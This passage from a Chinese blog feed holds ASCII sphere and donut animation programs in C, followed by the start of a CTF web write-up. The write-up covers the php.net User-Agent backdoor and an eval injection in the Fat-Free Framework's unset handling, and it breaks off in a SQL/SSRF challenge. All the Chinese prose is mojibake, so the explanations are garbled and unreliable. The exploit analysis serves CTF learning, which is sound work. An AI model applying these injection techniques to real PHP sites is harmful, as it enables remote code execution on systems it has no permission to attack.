class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">goto_xy</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">   HANDLE hOut;</span><br><span class="line">    hOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">   COORD pos = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">   SetConsoleCursorPosition(hOut, pos);</span><br><span class="line">&#125;</span><br><span class="line">main()&#123;</span><br><span class="line">    <span class="keyword">int</span> size=<span class="number">45</span>;</span><br><span class="line">    <span class="keyword">double</span> g=<span class="number">0.01</span>;</span><br><span class="line">    <span class="keyword">double</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">double</span> r=(<span class="keyword">double</span>(size)<span class="number">-4</span>)/<span class="number">2.0</span>;</span><br><span class="line">    <span class="keyword">double</span> light[<span class="number">3</span>]=&#123;<span class="number">-1.3</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">double</span> length=<span class="built_in">sqrt</span>(light[<span class="number">0</span>]*light[<span class="number">0</span>]+light[<span class="number">1</span>]*light[<span class="number">1</span>]+light[<span class="number">2</span>]*light[<span class="number">2</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">        light[i]=light[i]/length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> shade[]=<span class="string">&quot;.;!o*m0&amp;%@&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> out_i[size][size]=&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">double</span> rotate=<span class="number">0.0</span>;;rotate+=<span class="number">0.05</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_i[i][j]=<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">double</span> ro[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1.0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="built_in">cos</span>(rotate),-<span class="built_in">sin</span>(rotate)&#125;,&#123;<span class="number">0</span>,<span class="built_in">sin</span>(rotate),<span class="built_in">cos</span>(rotate)&#125;&#125;;</span><br><span class="line">        <span class="keyword">double</span> light_r[<span class="number">3</span>]=&#123;light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">0</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">0</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">                           light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">1</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">1</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">1</span>],</span><br><span class="line">                           light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">2</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">2</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">2</span>]&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">double</span> a=<span class="number">0.0</span>;a&lt;<span class="number">3.15</span>;a+=g)&#123;<span class="comment">//alpha </span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">double</span> b=<span class="number">0.0</span>;b&lt;<span class="number">3.15</span>;b+=g)&#123;<span class="comment">//beta </span></span><br><span class="line">                <span class="keyword">double</span> x=r*<span class="built_in">sin</span>(b)*<span class="built_in">cos</span>(a);</span><br><span class="line">                <span class="keyword">double</span> y=r*<span class="built_in">sin</span>(b)*<span class="built_in">sin</span>(a);</span><br><span class="line">                <span class="keyword">double</span> z=r*<span class="built_in">cos</span>(b);</span><br><span class="line">                <span class="keyword">double</span> result=(x/r*light_r[<span class="number">0</span>]+y/r*light_r[<span class="number">1</span>]+z/r*light_r[<span class="number">2</span>]+<span class="number">1.0</span>)*<span class="number">0.5</span>;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">final</span>=<span class="keyword">int</span>(result*<span class="number">10.0</span><span class="number">-1</span>);</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                if(final&gt;10||final&lt;0)&#123;</span></span><br><span class="line"><span class="comment">                    if(final&gt;10)final=10;</span></span><br><span class="line"><span class="comment">                    else if(final&lt;0)final=0;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">                <span class="keyword">int</span> cx=<span class="keyword">int</span>(x+move);</span><br><span class="line">                <span class="keyword">int</span> cy=<span class="keyword">int</span>(z+move);</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">final</span>&gt;out_i[cx][cy])<span class="comment">//è¿™ç§å–æœ€å¤§äº®åº¦çš„å†™æ³•æ˜æ˜¾æ˜¯ä¸å¥½çš„ï¼Œä½†è¿™ä¸ªä¾‹å­ç‰¹æ®Šï¼Œç”¨èµ·æ¥æ²¡é—®é¢˜</span></span><br><span class="line">                    out_i[cx][cy]=<span class="keyword">final</span>;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(out_i[i][j]!=<span class="number">-1</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[out_i[i][j]],shade[out_i[i][j]]);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        goto_xy(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™„ä¸Šç”œç”œåœˆçš„ä»£ç ï¼Œå†™æ–¹å—ä¹‹å‰æ²¡ä»”ç»†çœ‹è¿‡ï¼Œæ‰€ä»¥æˆ‘å†™çš„æ–¹å—éå¸¸å†—ä½™ï¼ˆä¸»è¦æ˜¯æƒ³å…ˆè‡ªå·±è¯•è¯•</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        doughnut    </div>    <div class='spoiler-content'>        <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">float</span> A = <span class="number">0</span>, B = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> i, j;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">float</span> z[<span class="number">1760</span>];</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">1760</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(b,<span class="number">32</span>,<span class="number">1760</span>);</span><br><span class="line">        <span class="built_in">memset</span>(z,<span class="number">0</span>,<span class="number">7040</span>);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; <span class="number">6.28</span>; j += <span class="number">0.07</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">6.28</span>; i += <span class="number">0.02</span>) &#123;</span><br><span class="line">                <span class="keyword">float</span> c = <span class="built_in">sin</span>(i);</span><br><span class="line">                <span class="keyword">float</span> d = <span class="built_in">cos</span>(j);</span><br><span class="line">                <span class="keyword">float</span> e = <span class="built_in">sin</span>(A);</span><br><span class="line">                <span class="keyword">float</span> f = <span class="built_in">sin</span>(j);</span><br><span class="line">                <span class="keyword">float</span> g = <span class="built_in">cos</span>(A);</span><br><span class="line">                <span class="keyword">float</span> h = d + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">float</span> D = <span class="number">1</span> / (c * h * e + f * g + <span class="number">5</span>);</span><br><span class="line">                <span class="keyword">float</span> l = <span class="built_in">cos</span>(i);</span><br><span class="line">                <span class="keyword">float</span> m = <span class="built_in">cos</span>(B);</span><br><span class="line">                <span class="keyword">float</span> n = <span class="built_in">sin</span>(B);</span><br><span class="line">                <span class="keyword">float</span> t = c * h * g - f * e;</span><br><span class="line">                <span class="keyword">int</span> x = <span class="number">40</span> + <span class="number">30</span> * D * (l * h * m - t * n);</span><br><span class="line">                <span class="keyword">int</span> y= <span class="number">12</span> + <span class="number">15</span> * D * (l * h * n + t * m);</span><br><span class="line">                <span class="keyword">int</span> o = x + <span class="number">80</span> * y;</span><br><span class="line">                <span class="keyword">int</span> N = <span class="number">8</span> * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n);</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">22</span> &gt; y &amp;&amp; y &gt; <span class="number">0</span> &amp;&amp; x &gt; <span class="number">0</span> &amp;&amp; <span class="number">80</span> &gt; x &amp;&amp; D &gt; z[o]) &#123;</span><br><span class="line">                    z[o] = D;</span><br><span class="line">                    b[o] = <span class="string">&quot;.,-~:;=!*#$@&quot;</span>[N &gt; <span class="number">0</span> ? N : <span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">1761</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(k % <span class="number">80</span> ? b[k] : <span class="number">10</span>);</span><br><span class="line">            A += <span class="number">0.00004</span>;</span><br><span class="line">            B += <span class="number">0.00002</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">30000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>    </div></div><p>ä¸ºäº†é˜²æ­¢ä½ ä»¬æƒ³çœ‹è§†é¢‘æ‰¾ä¸åˆ°ä¼ é€é—¨ï¼Œ<a href="https://www.youtube.com/watch?v=sW9npZVpiMI">Click Here</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> æ‘¸é±¼ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹è™ç¬¦2021 web</title>
      <link href="2021/04/10/i%E6%98%A5%E7%A7%8B%E8%99%8E%E7%AC%A62021/"/>
      <url>2021/04/10/i%E6%98%A5%E7%A7%8B%E8%99%8E%E7%AC%A62021/</url>
      
        <content type="html"><![CDATA[<p>è®°å½•é¢˜ç›®æ‰«ç›²ï¼Œåªæœ‰å‰ä¸‰é¢˜ï¼ŒåŒ…å«ä»¥ä¸‹pointsï¼š</p><p>â€‹    â‘ 3.28 php.netåé—¨</p><p>â€‹    â‘¡3F(FatFreeFramework)æ¡†æ¶</p><p>â€‹    â‘¢SQLä¸­md5()äº§ç”Ÿhexçš„â€™orâ€™è¿›è¡Œçš„æ³¨å…¥</p><p>â€‹    â‘£SSRFä¸gopheråè®®</p><span id="more"></span><h1 id="iæ˜¥ç§‹è™ç¬¦2021-web"><a href="#iæ˜¥ç§‹è™ç¬¦2021-web" class="headerlink" title="iæ˜¥ç§‹è™ç¬¦2021_web"></a>iæ˜¥ç§‹è™ç¬¦2021_web</h1><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><p>2021.3.28å‡ºäº†phpå®˜æ–¹gitä»“åº“git.php.netè¢«æ’å…¥æ¶æ„ä»£ç çš„äº‹ï¼Œè‹¥ä½¿ç”¨æ­¤æºç è¿›è¡Œå¼€å‘ï¼Œç½‘ç«™å°±ä¼šæ‰§è¡Œuser_agenttå¤´ä¸­ä»¥zerodiumå¼€å§‹çš„ä»»æ„ä»£ç ï¼Œæ³¨æ„double tï¼Œæ²¡æœ‰æ‰“é”™</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E7%AD%BE%E5%88%B0github.png"></p><center><a href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d">view on github</a></center><p>é¢˜ç›®ç¯å¢ƒæ˜¯ä¸€ä¸ªblogï¼Œæœ€åä¸€ç¯‡æ–‡ç« æè¿°äº†åšå®¢æ­å»ºè¿‡ç¨‹ï¼Œåœ¨æ²¡æœ‰hintçš„æƒ…å†µä¸‹è¿™æ˜¯å…¥æ‰‹ç‚¹</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E7%AD%BE%E5%88%B0blog.png"></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span> = <span class="keyword">require</span>(<span class="string">&#x27;1ib/base.php&#x27;</span>);</span><br><span class="line"><span class="variable">$f3</span>-&gt;set( <span class="string">&#x27;DEBUG&#x27;</span> ,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCREVERSION &lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCREversion is out date&#x27;</span>);</span><br><span class="line"><span class="comment">//Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span> [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f3</span>-&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p align='right'><small>å…³é”®å­—ï¼šframeworkï¼Œf3</small></p><p>æ­¤ä¸ºåŸºäºf3æ¡†æ¶ç¼–å†™çš„ä»£ç ï¼Œæ‹¿åˆ°æ‰‹æ—¶åº”å…ˆæœ¬åœ°æ­å»ºæ­¤æ¡†æ¶ï¼Œå¯¹äºæœ¬é¢˜ï¼Œè¿™æ ·ä½ æ‰æœ‰äº†base.phpï¼Œæ‰å¯ä»¥è§£é¢˜ï¼Œå„ç§ä¸ç†Ÿæ‚‰å¯¼è‡´æ‰¾ä¸åˆ°æœ¬é¢˜å…¥æ‰‹ç‚¹</p><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-f3Framework.png"></p><p>æŠŠé¢˜ç›®ä»£ç copyè¿‡æ¥ï¼ŒåŠ ä¸ŠrouteæŒ‡å®šè·¯å¾„åæœ¬åœ°è¿è¡Œï¼ˆä¹Ÿå°±æ˜¯è¯´è¦å…ˆè®¾ç½®<code>route</code>å†<code>run</code>ï¼Œä¸ç„¶æ¡†æ¶è·‘éƒ½è·‘ä¸èµ·æ¥ï¼Œæ€ä¹ˆè®¾ç½®æŸ¥ä¸€ä¸‹æ–‡æ¡£å°±çŸ¥é“äº†Â¯\_(ãƒ„)_/Â¯ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f3</span>-&gt;route(<span class="string">&#x27;GET /test.php&#x27;</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;route set successfully&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-f3run.png"></p><p>ç›´æ¥æŠ¥é”™äº†ï¼Œçœ‹çœ‹530è¡Œevalçš„æƒ…å†µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">#...</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$val</span>=preg_replace(<span class="string">&#x27;/^(\$hive)/&#x27;</span>,<span class="string">&#x27;$this-&gt;hive&#x27;</span>,</span><br><span class="line">                          <span class="keyword">$this</span>-&gt;compile(<span class="string">&#x27;@hive.&#x27;</span>.<span class="variable">$key</span>, <span class="literal">FALSE</span>));</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;unset(&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;);&#x27;</span>);    <span class="comment">#ç¬¬530è¡Œ</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$parts</span>[<span class="number">0</span>]==<span class="string">&#x27;SESSION&#x27;</span>) &#123;</span><br><span class="line">            session_commit();</span><br><span class="line">            session_start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿½ä¸€ä¸‹ä»£ç éªŒè¯ä¸€ä¸‹æ˜¯ä¸æ˜¯<code>unset</code>è§¦å‘çš„<code>clear()</code>ï¼Œå‘ç°è°ƒç”¨é“¾æ¡æ˜¯<code>__unset($key)</code>â†’<code>offsetunset($key)</code>â†’<code>clear($key)</code>å®é”¤</p><p>è§é‡Œé¢æœ‰ä¸€ä¸ª<code>compile()</code>ï¼Œåº·åº·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$evaluate</span>=<span class="literal">TRUE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (!<span class="variable">$evaluate</span>)</span><br><span class="line">        ? preg_replace_callback(</span><br><span class="line">            <span class="string">&#x27;/^@(\w+)((?:\..+|\[(?:(?:[^\[\]]*|(?R))*)\])*)/&#x27;</span>,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$expr</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$str</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$expr</span>[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expr</span>[<span class="number">2</span>]))</span><br><span class="line">                    <span class="variable">$str</span>.=preg_replace_callback(</span><br><span class="line">                        <span class="string">&#x27;/\.([^.\[\]]+)|\[((?:[^\[\]\&#x27;&quot;]*|(?R))*)\]/&#x27;</span>,</span><br><span class="line">                        <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$sub</span></span>) </span>&#123;</span><br><span class="line">                            <span class="variable">$val</span>=<span class="keyword">isset</span>(<span class="variable">$sub</span>[<span class="number">2</span>]) ? <span class="variable">$sub</span>[<span class="number">2</span>] : <span class="variable">$sub</span>[<span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">if</span> (ctype_digit(<span class="variable">$val</span>))</span><br><span class="line">                                <span class="variable">$val</span>=(<span class="keyword">int</span>)<span class="variable">$val</span>;</span><br><span class="line">                            <span class="variable">$out</span>=<span class="string">&#x27;[&#x27;</span>.<span class="keyword">$this</span>-&gt;export(<span class="variable">$val</span>).<span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="variable">$expr</span>[<span class="number">2</span>]</span><br><span class="line">                    );</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="variable">$str</span></span><br><span class="line">        )</span><br><span class="line"><span class="comment">#------------------ä¸‹é¢è¿™æ®µéƒ½æ— å…³ï¼Œæ¯•ç«Ÿclear()é‡Œä¼ äº†FALSE------------------</span></span><br><span class="line">        : preg_replace_callback(</span><br><span class="line">        <span class="string">&#x27;/(?&lt;!\w)@(\w+(?:(?:\-&gt;|::)\w+)?)&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27;((?:\.\w+|\[(?:(?:[^\[\]]*|(?R))*)\]|(?:\-&gt;|::)\w+|\()*)/&#x27;</span>,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$expr</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$str</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$expr</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">#...</span></span><br></pre></td></tr></table></figure><p>çœ‹æ ·å­å¯¹è¾“å…¥åšäº†æ”¹åŠ¨ï¼Œä½†å…¶å®ä¸æƒ³åˆ†æ<code>complie()</code>çš„è¯ï¼Œç›´æ¥<code>echo</code>å³å¯çŸ¥é“åˆ°åº•evaläº†ä»€ä¹ˆä»£ç </p><blockquote>å½“a=hello<br>[Out] unset('$this->hive['hello']');</blockquote><p>ä½†ç°åœ¨æ—¢ç„¶æ¯”èµ›å·²ç»ç»“æŸé‚£è¿˜æ˜¯ç¨å¾®æ·±å…¥çœ‹ä¸€ä¸‹<code>complie()</code>ï¼Œé‡åˆ°äº†æˆ‘æ²¡è§è¿‡çš„phpï¼šå›è°ƒï¼ŒåŒ¿åå‡½æ•°</p><ul><li><p>å›è°ƒï¼šåœ¨å‡½æ•°æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¸€èˆ¬æ˜¯ä¸èƒ½å»å¹²é¢„ä»–çš„è¡Œä¸ºçš„ï¼Œå½“å‡½æ•°è¢«è®¾è®¡æˆå¸¦æœ‰å›è°ƒåŠŸèƒ½æ—¶ï¼Œæˆ‘ä»¬å°±æœ‰å¯èƒ½åœ¨å‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œé€šè¿‡å›è°ƒå‡½æ•°å»å¹²é¢„ä»–</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"><span class="variable">$n</span>, <span class="variable">$f</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$n</span> &lt; <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span> ? <span class="variable">$f</span>(<span class="variable">$i</span>) : <span class="variable">$i</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ— å›è°ƒæ—¶</span></span><br><span class="line">foo(<span class="number">5</span>); <span class="comment">//01234</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//æœ‰å›è°ƒæ—¶</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$v</span> + <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">5</span>, <span class="string">&#x27;f1&#x27;</span>); <span class="comment">//02468</span></span><br></pre></td></tr></table></figure></li><li><p>åŒ¿åå‡½æ•°ï¼šå…è®¸ä¸´æ—¶åˆ›å»ºä¸€ä¸ªæ²¡æœ‰æŒ‡å®šåç§°çš„å‡½æ•°ã€‚æœ€ç»å¸¸ç”¨ä½œå›è°ƒå‡½æ•°<code>callable</code>å›è°ƒå‚æ•°çš„å€¼</p></li></ul><p>è€Œ<code>preg_replace_callback</code>é™¤äº†å¯ä»¥æŒ‡å®šä¸€ä¸ª <code>callback</code> æ›¿ä»£ <code>replacement</code> è¿›è¡Œæ›¿æ¢å­—ç¬¦ä¸²çš„è®¡ç®—ï¼Œå…¶ä»–æ–¹é¢ç­‰åŒäº<code>preg_replace</code></p><p>è‡³äºä»€ä¹ˆ<code>$this-&gt;hive</code>ä¹‹ç±»çš„æ‚ä¸ƒæ‚å…«çš„éƒ½æ˜¯åé¢æ‰åŠ ä¸Šå»çš„ï¼Œå’Œ<code>compile()</code>æ— å…³</p><p>å› ä¸ºä¼ å‚<code>a</code>ä¼šè¢«<code>compile</code>å¤„ç†ä¸º<code>[&#39;xxx&#39;]</code>çš„å½¢å¼ï¼Œæ‰€ä»¥éœ€è¦æ‰“ç ´è¿™ç§æ ¼å¼ï¼Œç„¶åç‚¹å·è¿æ¥å¹¶é—­åˆ<code>unset</code>ï¼Œæœ€å<code>eval</code>æ‰§è¡Œä»»æ„ä»£ç </p><p>çœ‹çœ‹è¿™ä¸ªæ­£åˆ™<code>&#39;/\.([^.\[\]]+)|\[((?:[^\[\]\&#39;&quot;]*|(?R))*)\]/&#39;</code>ï¼Œå¹¶æ²¡æœ‰åŒ¹é…æ¢è¡Œç¬¦ï¼Œæ‰€ä»¥å‡ºäº†æ¢è¡Œç¬¦è¿™ä¸ªæ­£åˆ™å°±ä¼šè¢«æ‰“æ–­ï¼Œäºæ˜¯ä¾¿è¶…åº¦æˆåŠŸ</p><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-%E6%8D%A2%E8%A1%8C%E7%AC%A6.png"></p><h2 id="æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ"><a href="#æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ" class="headerlink" title="æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ"></a>æ…¢æ…¢åšç®¡ç†ç³»ç»Ÿ</h2><blockquote>æè¿°ï¼šè¿™ä¸ªsqlå§ï¼Œæœ‰ç‚¹ssrfçš„æ ·å­ï¼Œé¦–é¡µæ˜¯ä¸€ä¸ªå¾ˆæ™®é€šçš„sqlæ³¨å…¥ï¼Œæ²¡æœ‰ä»€ä¹ˆèŠ±æ ·ï¼Œä½†æ˜¯æˆ‘çš„admin.phpæ˜¯ä¸€ä¸ªå†…ç½‘çš„ç®¡ç†ç³»ç»Ÿï¼Œåªè¦ä½ ç”¨â€œçœŸ-adminâ€çš„å¯†ç 